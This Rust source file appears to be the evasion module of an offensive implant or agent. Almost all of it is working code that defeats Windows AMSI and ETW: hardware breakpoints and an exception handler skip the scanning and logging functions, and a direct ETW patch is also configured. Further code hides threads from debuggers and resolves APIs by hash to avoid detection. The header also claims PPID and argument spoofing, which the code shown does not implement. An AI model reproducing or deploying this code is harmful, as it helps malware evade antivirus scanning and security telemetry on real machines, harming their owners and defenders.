//! Evasion mechanisms including HWBP-based AMSI/ETW bypass, PPID spoofing, argument spoofing, and callback execution.
//!
//! # Operation
//! - HWBP AMSI/ETW Bypass: Uses thread context hardware debug registers (Dr0-Dr3) to intercept execution at AMSI/ETW boundaries.
//! - PPID Spoofing: Manipulates thread attributes during process creation to masquerade the parent process.
//! - Argument Spoofing: Modifies the PEB command line at runtime.
//!
//! # Required Privileges
//! Standard user privileges are generally sufficient, though certain target processes for PPID spoofing may require SeDebugPrivilege.
//!
//! # Compatibility
//! Windows 10+ only (relies on specific offsets and newer thread context manipulation APIs).

#[cfg(windows)]
use std::sync::atomic::{AtomicUsize, Ordering};

#[cfg(windows)]
static AMSI_ADDR: AtomicUsize = AtomicUsize::new(0);
#[cfg(windows)]
static ETW_ADDR: AtomicUsize = AtomicUsize::new(0);
/// Pre-computed address of a `ret` (0xC3) gadget found during
/// `setup_hardware_breakpoints`.  Using a static avoids any memory scan or
/// `VirtualQuery` call from inside the VEH handler, where those calls risk
/// deadlock (loader lock / heap lock contention).
#[cfg(windows)]
static RET_GADGET: AtomicUsize = AtomicUsize::new(0);

#[cfg(windows)]
unsafe extern "system" fn veh_handler(
    exception_info: *mut winapi::um::winnt::EXCEPTION_POINTERS,
) -> i32 {
    let record = (*exception_info).ExceptionRecord;
    let context = (*exception_info).ContextRecord;

    if (*record).ExceptionCode == winapi::um::winnt::STATUS_SINGLE_STEP {
        let rip = (*context).Rip as usize;
        let amsi = AMSI_ADDR.load(Ordering::Relaxed);
        let etw = ETW_ADDR.load(Ordering::Relaxed);

        if (amsi != 0 && rip == amsi) || (etw != 0 && rip == etw) {
            // Bypass by clearing RAX (returning 0) and advancing RIP to a
            // pre-computed ret gadget.  The gadget address was resolved and
            // validated with VirtualQuery during setup_hardware_breakpoints,
            // before this handler was registered.  Scanning memory or calling
            // VirtualQuery here would risk deadlock (loader-lock / heap-lock
            // contention inside a VEH handler).
            (*context).Rax = 0;
            let gadget = RET_GADGET.load(Ordering::Relaxed);
            if gadget == 0 {
                // Gadget was not resolved at setup time; propagate the exception.
                return winapi::vc::excpt::EXCEPTION_CONTINUE_SEARCH;
            }
            // Redirect RIP to the ret gadget.  The CPU will pop [Rsp] into Rip
            // and advance Rsp by 8 (or 8+N for ret N), cleanly returning from
            // the intercepted AMSI/ETW function to its caller.
            (*context).Rip = gadget as u64;
            return winapi::vc::excpt::EXCEPTION_CONTINUE_EXECUTION;
        }
    }
    winapi::vc::excpt::EXCEPTION_CONTINUE_SEARCH
}

#[cfg(windows)]
pub unsafe fn setup_hardware_breakpoints() {
    use winapi::um::errhandlingapi::AddVectoredExceptionHandler;
    use winapi::um::handleapi::{CloseHandle, INVALID_HANDLE_VALUE};
    use winapi::um::processthreadsapi::{
        GetCurrentProcessId, GetThreadContext, OpenThread, ResumeThread, SetThreadContext,
        SuspendThread,
    };
    use winapi::um::tlhelp32::{
        CreateToolhelp32Snapshot, Thread32First, Thread32Next, TH32CS_SNAPTHREAD, THREADENTRY32,
    };
    use winapi::um::winnt::{CONTEXT, CONTEXT_DEBUG_REGISTERS, THREAD_ALL_ACCESS};

    type NtGetContextThreadFn =
        unsafe extern "system" fn(winapi::um::winnt::HANDLE, *mut CONTEXT) -> i32;
    type NtSetContextThreadFn =
        unsafe extern "system" fn(winapi::um::winnt::HANDLE, *mut CONTEXT) -> i32;

    let mut nt_get_context_thread: Option<NtGetContextThreadFn> = None;
    let mut nt_set_context_thread: Option<NtSetContextThreadFn> = None;

    let mut configured = false;

    let amsi: *mut winapi::ctypes::c_void =
        pe_resolve::get_module_handle_by_hash(pe_resolve::HASH_AMSI_DLL).unwrap_or(0) as *mut _;
    if !amsi.is_null() {
        let addr: *mut winapi::ctypes::c_void =
            pe_resolve::get_proc_address_by_hash(amsi as usize, pe_resolve::HASH_AMSISCANBUFFER)
                .unwrap_or(0) as *mut _;
        if !addr.is_null() {
            AMSI_ADDR.store(addr as usize, Ordering::Relaxed);
            configured = true;
        }
    }

    let ntdll: *mut winapi::ctypes::c_void =
        pe_resolve::get_module_handle_by_hash(pe_resolve::HASH_NTDLL_DLL).unwrap_or(0) as *mut _;
    if !ntdll.is_null() {
        let addr: *mut winapi::ctypes::c_void =
            pe_resolve::get_proc_address_by_hash(ntdll as usize, pe_resolve::HASH_ETWEVENTWRITE)
                .unwrap_or(0) as *mut _;
        if !addr.is_null() {
            ETW_ADDR.store(addr as usize, Ordering::Relaxed);
            configured = true;
        }

        let nt_get_hash = pe_resolve::hash_str(b"NtGetContextThread\0");
        let nt_set_hash = pe_resolve::hash_str(b"NtSetContextThread\0");

        let nt_get_addr: *mut winapi::ctypes::c_void =
            pe_resolve::get_proc_address_by_hash(ntdll as usize, nt_get_hash).unwrap_or(0) as _;
        if !nt_get_addr.is_null() {
            nt_get_context_thread = Some(std::mem::transmute(nt_get_addr));
        }

        let nt_set_addr: *mut winapi::ctypes::c_void =
            pe_resolve::get_proc_address_by_hash(ntdll as usize, nt_set_hash).unwrap_or(0) as _;
        if !nt_set_addr.is_null() {
            nt_set_context_thread = Some(std::mem::transmute(nt_set_addr));
        }

        // Pre-compute a `ret` gadget from NtClose so that veh_handler never
        // needs to scan memory or call VirtualQuery at exception time.
        // VirtualQuery is safe here (not inside a VEH handler).
        'gadget: {
            use winapi::um::memoryapi::VirtualQuery;
            use winapi::um::winnt::{MEMORY_BASIC_INFORMATION, MEM_COMMIT, PAGE_EXECUTE_READ};

            let nt_close_raw =
                pe_resolve::get_proc_address_by_hash(ntdll as usize, pe_resolve::HASH_NTCLOSE)
                    .unwrap_or(0);
            if nt_close_raw == 0 {
                break 'gadget;
            }

            // Follow inline hook trampolines (same bounded-depth logic that
            // was previously inside veh_handler) to reach the real stub.
            let mut p = nt_close_raw as *const u8;
            const MAX_DEPTH: usize = 3;
            for _ in 0..MAX_DEPTH {
                // Verify the current byte is readable before peeking at the opcode.
                let mut mbi: MEMORY_BASIC_INFORMATION = std::mem::zeroed();
                if VirtualQuery(
                    p as *const _,
                    &mut mbi,
                    std::mem::size_of::<MEMORY_BASIC_INFORMATION>(),
                ) == 0
                    || mbi.State != MEM_COMMIT
                {
                    break 'gadget;
                }

                if *p == 0xFF && *p.add(1) == 0x25 {
                    let disp = std::ptr::read_unaligned(p.add(2) as *const i32);
                    let slot = (p as usize).wrapping_add(6).wrapping_add(disp as isize as usize);
                    let target = std::ptr::read_unaligned(slot as *const usize);
                    if target == 0 {
                        break 'gadget;
                    }
                    p = target as *const u8;
                } else if *p == 0xE9 {
                    let disp = std::ptr::read_unaligned(p.add(1) as *const i32);
                    let target =
                        (p as usize).wrapping_add(5).wrapping_add(disp as isize as usize);
                    if target == 0 {
                        break 'gadget;
                    }
                    p = target as *const u8;
                } else {
                    break; // not a trampoline; scan from here
                }
            }

            // Scan up to 64 bytes for 0xC3 (ret), verifying each page with
            // VirtualQuery before the first dereference on that page.
            let mut last_page: usize = usize::MAX;
            for _ in 0..64usize {
                let addr = p as usize;
                let page = addr & !0xFFF_usize;
                if page != last_page {
                    // New page: verify it is committed and readable/executable.
                    let mut mbi: MEMORY_BASIC_INFORMATION = std::mem::zeroed();
                    if VirtualQuery(
                        p as *const _,
                        &mut mbi,
                        std::mem::size_of::<MEMORY_BASIC_INFORMATION>(),
                    ) == 0
                        || mbi.State != MEM_COMMIT
                    {
                        break 'gadget;
                    }
                    // Require at least PAGE_EXECUTE_READ.
                    let prot = mbi.Protect & 0xFF; // mask off guard/nocache modifiers
                    if prot < PAGE_EXECUTE_READ {
                        break 'gadget;
                    }
                    last_page = page;
                }

                if *p == 0xC3 {
                    // `ret` is 1 byte — always within its page.
                    RET_GADGET.store(addr, Ordering::Relaxed);
                    log::debug!("evasion: ret gadget pre-computed at {:#x}", addr);
                    break 'gadget;
                }

                // Skip 0xC2 (ret N, 3 bytes) if it would straddle a page boundary.
                if *p == 0xC2 {
                    if addr + 3 <= (page + 0x1000) {
                        RET_GADGET.store(addr, Ordering::Relaxed);
                        log::debug!("evasion: ret-N gadget pre-computed at {:#x}", addr);
                    }
                    break 'gadget;
                }

                p = p.add(1);
            }
        } // end 'gadget
    }

    if nt_set_context_thread.is_some() {
        log::debug!("evasion: using NtSetContextThread for debug register modification");
    } else {
        log::debug!("evasion: NtSetContextThread not available, falling back to SetThreadContext");
        log::warn!(
            "evasion: SetThreadContext fallback path in use for debug register modification"
        );
    }

    if !configured {
        return;
    }

    // Register our VEH first; store the handle so it can be removed later
    // via RemoveVectoredExceptionHandler if needed (M-25 fix).
    static VEH_HANDLE: std::sync::OnceLock<usize> = std::sync::OnceLock::new();
    let veh = AddVectoredExceptionHandler(1, Some(veh_handler));
    if !veh.is_null() {
        VEH_HANDLE.get_or_init(|| veh as usize);
    }

    // Propagate hardware breakpoints to all existing threads in the process
    let pid = GetCurrentProcessId();
    let snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
    if snapshot != INVALID_HANDLE_VALUE {
        let mut te32: THREADENTRY32 = std::mem::zeroed();
        te32.dwSize = std::mem::size_of::<THREADENTRY32>() as u32;

        if Thread32First(snapshot, &mut te32) != 0 {
            loop {
                if te32.th32OwnerProcessID == pid {
                    let h_thread = OpenThread(THREAD_ALL_ACCESS, 0, te32.th32ThreadID);
                    if !h_thread.is_null() {
                        // (1) SuspendThread: returns -1 (0xFFFFFFFF) on failure.
                        let suspend_count = SuspendThread(h_thread);
                        if suspend_count == u32::MAX {
                            log::warn!(
                                "evasion: SuspendThread failed for tid {} — skipping context modification",
                                te32.th32ThreadID
                            );
                            CloseHandle(h_thread);
                            // Continue to next thread; don't attempt context changes
                            // on a thread we couldn't suspend.
                            if Thread32Next(snapshot, &mut te32) == 0 {
                                break;
                            }
                            continue;
                        }

                        // (5) Save original context for restoration on error.
                        let mut orig_ctx: CONTEXT = std::mem::zeroed();
                        orig_ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS;
                        let _orig_saved = if let Some(nt_get_ctx) = nt_get_context_thread {
                            let status = nt_get_ctx(h_thread, &mut orig_ctx);
                            if status >= 0 {
                                true
                            } else {
                                GetThreadContext(h_thread, &mut orig_ctx) != 0
                            }
                        } else {
                            GetThreadContext(h_thread, &mut orig_ctx) != 0
                        };

                        // (2) GetThreadContext: returns 0 on failure.
                        let mut ctx: CONTEXT = std::mem::zeroed();
                        ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS;
                        let got_context = if let Some(nt_get_ctx) = nt_get_context_thread {
                            let status = nt_get_ctx(h_thread, &mut ctx);
                            if status >= 0 {
                                true
                            } else {
                                log::warn!(
                                    "evasion: NtGetContextThread failed for tid {} (status=0x{:08x}), falling back to GetThreadContext",
                                    te32.th32ThreadID,
                                    status as u32
                                );
                                GetThreadContext(h_thread, &mut ctx) != 0
                            }
                        } else {
                            GetThreadContext(h_thread, &mut ctx) != 0
                        };

                        if !got_context {
                            log::warn!(
                                "evasion: GetThreadContext failed for tid {} — restoring suspension and skipping",
                                te32.th32ThreadID
                            );
                            ResumeThread(h_thread);
                            CloseHandle(h_thread);
                            if Thread32Next(snapshot, &mut te32) == 0 {
                                break;
                            }
                            continue;
                        }

                        // Modify debug registers.
                        ctx.Dr0 = AMSI_ADDR.load(Ordering::Relaxed) as u64;
                        ctx.Dr1 = ETW_ADDR.load(Ordering::Relaxed) as u64;
                        // Enable local breakpoints for Dr0 (bit 0) and Dr1 (bit 2)
                        ctx.Dr7 |= (1 << 0) | (1 << 2);

                        let set_ok = if let Some(nt_set_ctx) = nt_set_context_thread {
                            let status = nt_set_ctx(h_thread, &mut ctx);
                            if status < 0 {
                                log::warn!(
                                    "evasion: NtSetContextThread failed for tid {} (status=0x{:08x}), falling back to SetThreadContext",
                                    te32.th32ThreadID,
                                    status as u32
                                );
                                SetThreadContext(h_thread, &ctx) != 0
                            } else {
                                true
                            }
                        } else {
                            SetThreadContext(h_thread, &ctx) != 0
                        };

                        // (3) Verify SetThreadContext by re-reading and comparing Dr0/Dr1/Dr7.
                        if set_ok {
                            let mut verify_ctx: CONTEXT = std::mem::zeroed();
                            verify_ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS;
                            let verify_ok = if let Some(nt_get_ctx) = nt_get_context_thread {
                                let status = nt_get_ctx(h_thread, &mut verify_ctx);
                                if status >= 0 { true } else {
                                    GetThreadContext(h_thread, &mut verify_ctx) != 0
                                }
                            } else {
                                GetThreadContext(h_thread, &mut verify_ctx) != 0
                            };

                            if !verify_ok
                                || verify_ctx.Dr0 != ctx.Dr0
                                || verify_ctx.Dr1 != ctx.Dr1
                                || (verify_ctx.Dr7 & ((1 << 0) | (1 << 2))) != (ctx.Dr7 & ((1 << 0) | (1 << 2)))
                            {
                                log::warn!(
                                    "evasion: SetThreadContext verification failed for tid {} — Dr0={:#x} (expected {:#x}), Dr1={:#x} (expected {:#x}), restoring original context",
                                    te32.th32ThreadID,
                                    verify_ctx.Dr0, ctx.Dr0,
                                    verify_ctx.Dr1, ctx.Dr1,
                                );
                                // Restore original debug registers.
                                if _orig_saved {
                                    let _ = if let Some(nt_set_ctx) = nt_set_context_thread {
                                        nt_set_ctx(h_thread, &mut orig_ctx)
                                    } else {
                                        if SetThreadContext(h_thread, &orig_ctx) != 0 { 0 } else { -1 }
                                    };
                                }
                            }
                        } else {
                            log::warn!(
                                "evasion: SetThreadContext failed for tid {} — debug registers not modified",
                                te32.th32ThreadID
                            );
                        }

                        // (4) ResumeThread: returns 0 if the thread was not previously
                        // suspended, or -1 (0xFFFFFFFF) on error.
                        let resume_result = ResumeThread(h_thread);
                        if resume_result == u32::MAX {
                            log::error!(
                                "evasion: ResumeThread failed for tid {} — thread may be left in suspended state!",
                                te32.th32ThreadID
                            );
                        } else if resume_result == 0 {
                            log::warn!(
                                "evasion: ResumeThread returned 0 for tid {} — thread was not in suspended state",
                                te32.th32ThreadID
                            );
                        }
                        CloseHandle(h_thread);
                    }
                }
                if Thread32Next(snapshot, &mut te32) == 0 {
                    break;
                }
            }
        }
        CloseHandle(snapshot);
    }
}

// Backward compatibility for existing patch functions in lib.rs
#[cfg(windows)]
pub unsafe fn patch_amsi() {
    setup_hardware_breakpoints();
}

#[cfg(not(windows))]
/// # Safety
///
/// No-op stub on non-Windows; always safe to call.
pub unsafe fn patch_amsi() {}

/// Apply the ETW bypass using the method and mode configured in the agent config.
///
/// Defaults to [`common::config::EtwPatchMethod::Direct`] when `method` is
/// `None`, which overwrites the ETW function entry points with `ret` (0xC3).
/// When `Hwbp` is selected the existing hardware-breakpoint VEH approach is
/// used instead.  Both approaches may be layered: if direct patching fails
/// (e.g. `VirtualProtect` is blocked by CFG), the caller should fall back to
/// `setup_hardware_breakpoints()` independently.
///
/// `mode` controls whether the direct-patch is applied on newer Windows builds
/// (see [`common::config::EtwPatchMode`]).  Defaults to `Safe` when `None`.
///
/// # Safety
///
/// Modifies process state; see [`crate::etw_patch::patch_etw`] and
/// [`setup_hardware_breakpoints`] for their respective safety requirements.
pub unsafe fn setup_etw_patch(
    method: Option<&common::config::EtwPatchMethod>,
    mode: Option<&common::config::EtwPatchMode>,
) {
    use common::config::EtwPatchMethod;
    let mode = mode.cloned().unwrap_or_default();
    match method.unwrap_or(&EtwPatchMethod::Direct) {
        EtwPatchMethod::Direct => crate::etw_patch::patch_etw_with_mode(mode),
        EtwPatchMethod::Hwbp => {
            #[cfg(windows)]
            setup_hardware_breakpoints();
        }
    }
}

#[cfg(windows)]
pub fn hide_current_thread() {
    unsafe {
        let ntdll: *mut winapi::ctypes::c_void =
            pe_resolve::get_module_handle_by_hash(pe_resolve::HASH_NTDLL_DLL).unwrap_or(0) as _;
        if !ntdll.is_null() {
            let func: *mut winapi::ctypes::c_void = pe_resolve::get_proc_address_by_hash(
                ntdll as usize,
                pe_resolve::HASH_NTSETINFORMATIONTHREAD,
            )
            .unwrap_or(0) as _;
            if !func.is_null() {
                let nt_set_info_thread: extern "system" fn(
                    winapi::um::winnt::HANDLE,
                    u32,
                    *mut winapi::ctypes::c_void,
                    u32,
                ) -> i32 = std::mem::transmute(func);
                nt_set_info_thread(
                    -2isize as winapi::um::winnt::HANDLE, // GetCurrentThread()
                    0x11,                                 // ThreadHideFromDebugger
                    std::ptr::null_mut(),
                    0,
                );
            }
        }
    }
}

#[cfg(not(windows))]
pub fn hide_current_thread() {}

/// Apply hardware breakpoints for AMSI/ETW bypass to the *calling* thread.
/// Called automatically by [`spawn_hidden_thread`]; call this at the start of
/// any other thread that must also be covered by the HWBP bypass.
#[cfg(windows)]
pub unsafe fn apply_hwbp_to_current_thread() {
    use winapi::um::processthreadsapi::{GetCurrentThread, GetThreadContext, SetThreadContext};
    use winapi::um::winnt::{CONTEXT, CONTEXT_DEBUG_REGISTERS};

    let amsi = AMSI_ADDR.load(Ordering::Relaxed);
    let etw = ETW_ADDR.load(Ordering::Relaxed);
    if amsi == 0 && etw == 0 {
        return; // HWBPs not yet configured; skip silently
    }

    // Resolve Nt* context variants from ntdll via PEB walk to reduce
    // visibility (same pattern as setup_hardware_breakpoints).
    type NtGetContextThreadFn =
        unsafe extern "system" fn(winapi::um::winnt::HANDLE, *mut CONTEXT) -> i32;
    type NtSetContextThreadFn =
        unsafe extern "system" fn(winapi::um::winnt::HANDLE, *mut CONTEXT) -> i32;

    let ntdll = pe_resolve::get_module_handle_by_hash(pe_resolve::HASH_NTDLL_DLL).unwrap_or(0);
    let nt_get_ctx: Option<NtGetContextThreadFn> = if ntdll != 0 {
        pe_resolve::get_proc_address_by_hash(
            ntdll,
            pe_resolve::hash_str(b"NtGetContextThread\0"),
        )
        .map(|a| std::mem::transmute(a))
    } else {
        None
    };
    let nt_set_ctx: Option<NtSetContextThreadFn> = if ntdll != 0 {
        pe_resolve::get_proc_address_by_hash(
            ntdll,
            pe_resolve::hash_str(b"NtSetContextThread\0"),
        )
        .map(|a| std::mem::transmute(a))
    } else {
        None
    };

    if nt_set_ctx.is_none() {
        log::warn!(
            "evasion: apply_hwbp_to_current_thread: SetThreadContext fallback path in use for debug register modification"
        );
    }

    let mut ctx: CONTEXT = std::mem::zeroed();
    ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS;
    let h = GetCurrentThread();

    // Save original context for restoration on verification failure.
    let mut orig_ctx: CONTEXT = std::mem::zeroed();
    orig_ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS;
    let orig_saved = if let Some(nt_get) = nt_get_ctx {
        let status = nt_get(h, &mut orig_ctx);
        if status >= 0 { true } else {
            GetThreadContext(h, &mut orig_ctx) != 0
        }
    } else {
        GetThreadContext(h, &mut orig_ctx) != 0
    };

    let mut ctx: CONTEXT = std::mem::zeroed();
    ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS;

    let got_ctx = if let Some(nt_get) = nt_get_ctx {
        let status = nt_get(h, &mut ctx);
        if status < 0 {
            log::warn!(
                "evasion: apply_hwbp_to_current_thread: NtGetContextThread failed (status=0x{:08x}), falling back to GetThreadContext",
                status as u32
            );
            GetThreadContext(h, &mut ctx) != 0
        } else {
            true
        }
    } else {
        GetThreadContext(h, &mut ctx) != 0
    };

    if !got_ctx {
        log::warn!(
            "evasion: apply_hwbp_to_current_thread: GetThreadContext failed — skipping HWBP setup"
        );
        return;
    }

    ctx.Dr0 = amsi as u64;
    ctx.Dr1 = etw as u64;
    ctx.Dr7 |= (1 << 0) | (1 << 2); // enable local breakpoints for Dr0 and Dr1

    let set_ok = if let Some(nt_set) = nt_set_ctx {
        let status = nt_set(h, &mut ctx);
        if status < 0 {
            log::warn!(
                "evasion: apply_hwbp_to_current_thread: NtSetContextThread failed (status=0x{:08x}), falling back to SetThreadContext",
                status as u32
            );
            SetThreadContext(h, &ctx) != 0
        } else {
            true
        }
    } else {
        SetThreadContext(h, &ctx) != 0
    };

    if !set_ok {
        log::warn!(
            "evasion: apply_hwbp_to_current_thread: SetThreadContext failed — debug registers not modified"
        );
        return;
    }

    // Verify SetThreadContext by re-reading and comparing Dr0/Dr1/Dr7.
    let mut verify_ctx: CONTEXT = std::mem::zeroed();
    verify_ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS;
    let verify_ok = if let Some(nt_get) = nt_get_ctx {
        let status = nt_get(h, &mut verify_ctx);
        if status >= 0 { true } else {
            GetThreadContext(h, &mut verify_ctx) != 0
        }
    } else {
        GetThreadContext(h, &mut verify_ctx) != 0
    };

    if !verify_ok
        || verify_ctx.Dr0 != ctx.Dr0
        || verify_ctx.Dr1 != ctx.Dr1
        || (verify_ctx.Dr7 & ((1 << 0) | (1 << 2))) != (ctx.Dr7 & ((1 << 0) | (1 << 2)))
    {
        log::warn!(
            "evasion: apply_hwbp_to_current_thread: SetThreadContext verification failed — Dr0={:#x} (expected {:#x}), Dr1={:#x} (expected {:#x}), restoring original context",
            verify_ctx.Dr0, ctx.Dr0,
            verify_ctx.Dr1, ctx.Dr1,
        );
        // Restore original debug registers.
        if orig_saved {
            let _ = if let Some(nt_set) = nt_set_ctx {
                nt_set(h, &mut orig_ctx)
            } else {
                if SetThreadContext(h, &orig_ctx) != 0 { 0i32 } else { -1i32 }
            };
        }
    }
}

pub fn spawn_hidden_thread<F, T>(f: F) -> std::thread::JoinHandle<T>
where
    F: FnOnce() -> T + Send + 'static,
    T: Send + 'static,
{
    std::thread::spawn(move || {
        #[cfg(windows)]
        unsafe {
            apply_hwbp_to_current_thread();
        }
        hide_current_thread();
        f()
    })
}
